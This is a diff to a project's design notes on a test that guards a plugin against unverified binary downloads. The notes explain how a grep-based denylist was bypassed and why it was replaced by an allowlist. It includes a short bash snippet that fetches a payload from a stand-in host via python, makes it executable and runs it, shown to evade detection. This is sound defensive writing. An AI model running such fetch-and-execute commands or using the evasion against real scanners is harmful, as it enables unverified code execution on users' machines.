@@ -307,7 +307,27 @@ Round 2 rated an unverified download CRITICAL. It was fixed in the file the repo
 named, and round 3 found the sibling downloader in the same plugin — same release, other
 binary — still doing every one of the same things.
 
-`scripts/tests/no-unverified-download.test.sh` asserts the property instead: it scans
-every shipped script and fails if any of them downloads or execs outside the shared
-path. A third downloader added later goes red on its own, with nobody remembering to
-extend the test.
+`scripts/tests/no-unverified-download.test.sh` asserts the property instead — but the
+first version of it still did not, and how it failed is the point.
+
+It enumerated what a violation looks like: grep for `curl`, grep for `chmod +x`. A
+reviewer said that matched spellings rather than the property. Trying to break it took one
+attempt:
+
+```bash
+python3 -c "…urlretrieve…" https://example.com/payload "$HOME/bin/evil3"
+chmod 755 "$HOME/bin/evil3"
+"$HOME/bin/evil3" "$@"
+```
+
+No `curl`, no `chmod +x`, no `exec "$BINARY"` — three clauses, all walked around, doing
+exactly the thing the CRITICAL was filed about. The scanner reported **3 passed, 0
+failed**.
+
+So it is an allowlist now: exactly one file may fetch, exactly one may verify, and every
+other script under `plugin/` must be free of network access and of running anything out of
+the install directory. **Enumerate what is permitted, not what is forbidden** — a list of
+violations can always be walked around, a list of permitted files cannot. The maintenance
+cost is that a new fetch mechanism has to be added to the pattern; that cost is the right
+one, because the alternative is a scanner that silently stops covering whatever gets
+invented next.
